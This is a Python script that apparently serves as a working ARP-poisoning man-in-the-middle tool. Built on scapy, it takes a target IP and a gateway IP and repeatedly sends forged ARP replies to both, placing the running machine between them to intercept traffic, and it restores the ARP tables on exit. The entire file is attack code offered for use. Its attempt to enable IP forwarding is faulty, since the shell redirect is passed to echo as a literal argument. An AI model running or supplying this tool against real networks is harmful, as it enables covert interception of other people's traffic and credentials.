"""
this file contais implementation for ARP-Poisoning attack,
i.e. we implemented here Man-In-The-Middle attack.
:author: Lior Vinman
:version: 1.2
:date: 04/04/2023
"""

import scapy.all as scapy
import optparse
import time
import subprocess

BROADCAST_MAC_ADDRESS = "ff:ff:ff:ff:ff:ff"
ARP_RESPONSE = 2
TIMEOUT = 1
SCAPY_OUTPUT = False
TIMES_TO_SEND = 4

RED_COLOR = "\033[31m"
GREEN_COLOR = "\033[32m"
BLUE_COLOR = "\033[34m"
RESTORE_COLOR = "\033[0m"


def get_arguments():
    """
    this function gets arguments from standard input (-t <target_ip> -g <gateway_ip>)
    :return: options with target and gateway ip addresses
    """
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ipv4", help="target IP address to attack")
    parser.add_option("-g", "--gateway", dest="gateway_ipv4", help="IP address of the router")
    (options, arguments) = parser.parse_args()
    if not options.target_ipv4:
        parser.error("[-] Please specify a target IP to attack, use --help for more info")
    elif not options.gateway_ipv4:
        parser.error("[-] Please specify a router gateway IP, use --help for more info")
    else:
        return options


def get_mac_address(ipv4):
    """
    this function searches for the MAC address of given IPv4 address
    :param ipv4:
    :return: MAC address of given IPv4 address if found in LAN, else - None
    """
    arp_request = scapy.ARP(pdst=ipv4)  # "Who is <ipv4>?"
    broadcast = scapy.Ether(dst=BROADCAST_MAC_ADDRESS)  # Broadcast message for all devs in LAN
    arp_broadcast_request = broadcast / arp_request
    answers = scapy.srp(arp_broadcast_request, timeout=TIMEOUT, verbose=SCAPY_OUTPUT)[0]
    if answers:
        return answers[0][1].hwsrc
    else:
        return None


def arp_spoof(target_ipv4, spoof_ipv4):
    """
    this function is arp-poisoning the arp table of target address with other machine
    :param target_ipv4: the target to spoof arp table
    :param spoof_ipv4: the ip that should replace
    """
    packet = scapy.ARP(op=ARP_RESPONSE, pdst=target_ipv4, hwdst=get_mac_address(spoof_ipv4), psrc=spoof_ipv4)
    scapy.send(packet, verbose=SCAPY_OUTPUT)


def restore_arp_table(src_ipv4, dst_ipv4):
    """
    this function is restoring the arp tables after poisoning
    :param src_ipv4: the source IPv4 address to restore
    :param dst_ipv4: the destination IPv4 address to change to
    :return:
    """
    packet = scapy.ARP(op=ARP_RESPONSE, pdst=dst_ipv4, hwdst=get_mac_address(dst_ipv4), psrc=src_ipv4,
                       hwsrc=get_mac_address(src_ipv4))
    scapy.send(packet, count=TIMES_TO_SEND, verbose=SCAPY_OUTPUT)


def packets_flow(status):
    """
    this function allow/disallow packets forwarding & flow for traffic that goes through local machine
    :param status: allow or disallow the forwarding
    :return: True if packets forward was allowed, False else
    """
    if status:
        subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
        return True
    else:
        subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.DEVNULL)
        return False


def main():
    opts = get_arguments()
    print(f"{BLUE_COLOR}Attack-descriptor: ({opts.target_ipv4} <-> This-Machine <-> {opts.gateway_ipv4})",
          f"<-> Outer-Internet{RESTORE_COLOR}")
    try:
        count_packets = 0
        if packets_flow(True):
            print(f"{GREEN_COLOR}[+] Packet forwarding was enabled{RESTORE_COLOR}")
        while True:
            arp_spoof(opts.target_ipv4, opts.gateway_ipv4)
            arp_spoof(opts.gateway_ipv4, opts.target_ipv4)
            count_packets += 2
            print(f"\r{GREEN_COLOR}[+] Packets sent: ", count_packets, f"{RESTORE_COLOR}", end="")
            time.sleep(1)
    except KeyboardInterrupt as KIA:
        print(f"\n{RED_COLOR}[-] Stopping attack & restoring ARP-tables...{RESTORE_COLOR}")
        restore_arp_table(opts.target_ipv4, opts.gateway_ipv4)
        restore_arp_table(opts.gateway_ipv4, opts.target_ipv4)


if __name__ == "__main__":
    main()
